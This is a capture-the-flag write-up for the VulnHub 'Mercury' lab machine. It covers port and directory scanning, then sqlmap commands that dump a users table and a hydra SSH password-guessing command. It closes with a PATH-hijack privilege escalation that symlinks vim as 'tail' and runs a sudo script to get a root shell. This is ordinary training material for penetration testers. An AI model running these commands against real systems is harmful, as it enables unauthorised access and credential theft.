# MERCURY
Mercury is an easier box, with no brute-forcing required. There are two flags on the box: a user and a root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware.

- image file can be downloaded from [here](https://www.vulnhub.com/entry/the-planets-mercury,544/)

<br>

## Enumeration
- nmap scan:
  <br>
  
![mercury_nmap](https://github.com/shybu9/vulnhub/assets/112984045/7ebc1461-7fb5-4bfd-8faa-1aaef88c3a8d)

- port scan using [personal_tool]():
 <br>
 
![mercury_portscan](https://github.com/shybu9/vulnhub/assets/112984045/d0eb86bf-00c2-4745-ae83-351a759a7f61)

- gobuster scan:
<br>

![mercury_gobuster_comman](https://github.com/shybu9/vulnhub/assets/112984045/77323c20-aae6-4529-a7bc-f1f671ba2e4e)

### After scan analysis:
- open ports: 22 (SSH) & 8080 (HTTP_PROXY)
- web directories: /robots.txt

### Web page enumeration:
<br>

![mercury_robots](https://github.com/shybu9/vulnhub/assets/112984045/3bb9d318-d61e-4137-93fb-1b3e43fa3364)
<br>
- robots.txt disallows '*' user agent for directory '/'

<br>

```
http://192.168.188.169/*
```
![mercury_ ](https://github.com/shybu9/vulnhub/assets/112984045/fa516418-d1a9-4bf0-b902-c5f47f3e01ca)

## Initial Foothold
- directory '/mercuryfacts' seems to have an SQLI-vulnerable perimeter
<br>

```
sqlmap --url http://192.168.188.169/mercuryfacts --dbs --batch
```
![mercury_sqli_dbs](https://github.com/shybu9/vulnhub/assets/112984045/bfe70f54-59d1-4b35-b53b-8e8d819b9699)
<br>

```
sqlmap --url http://192.168.188.169/mercuryfacts -D mercury --tables --batch
```
![mercury_sqli_users](https://github.com/shybu9/vulnhub/assets/112984045/7a120954-ee73-4338-ab15-746ce2399adc)
<br>
```
sqlmap --url http://192.168.188.169/mercuryfacts -D mercury -T users --dump --batch
```
![mercury_sqli_user_pass](https://github.com/shybu9/vulnhub/assets/112984045/77c357d5-59d6-4e5a-9f0a-9595d06c1465)

<br>

### Finding the right credentials using hydra
- A list of usernames and passwords can be generated from this sqlmap dumps
```
hydra -L users_list -P pswds_list ssh://192.168.188.169
```
![mercury_hydra](https://github.com/shybu9/vulnhub/assets/112984045/d766d37a-8ec7-41d6-bdb7-f3396375f6ac)
<br>

## User Flag
![mercury_userflag](https://github.com/shybu9/vulnhub/assets/112984045/a1eb18d5-2415-41da-9a72-a9bcf3c52dd2)
<br>

### horizantal privesc
- there was a note kept under 'mercury_proj' directory which has base64 encoded password of both web
<br>

```
cat mercury_proj/note.txt
```
![note_decode](https://github.com/shybu9/vulnhub/assets/112984045/92d43e5d-5988-4839-8d48-6413270dd0fe)

```
su linuxmaster
```
![mercury_note_su_linux_master](https://github.com/shybu9/vulnhub/assets/112984045/e589a2fd-3807-4b69-b3f5-ab7200119bcd)

<br>

## privesc to root

```
sudo -l
```
![mercury_cat_privesc](https://github.com/shybu9/vulnhub/assets/112984045/a77c673c-5217-4090-a0c4-b760339b08a0)

- file 'usr/bin/check_syslog.sh' can be executed by anyone but can only be edited by root.
- an environment variable 'tail' is used without mentioning the full path.
- this env variable can be abused by:

```
ln -s /usr/bin/vim tail
```
```
export PATH=$(pwd):$PATH
```
![mercury_privesc_cmds](https://github.com/shybu9/vulnhub/assets/112984045/d38882ca-4d10-4b60-a36b-1ac697a5d3b5)

```
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```
```
:!/bin/bash
```
![mercury_rootflag](https://github.com/shybu9/vulnhub/assets/112984045/027a1773-97e0-4567-ba41-e5682d724bb1)


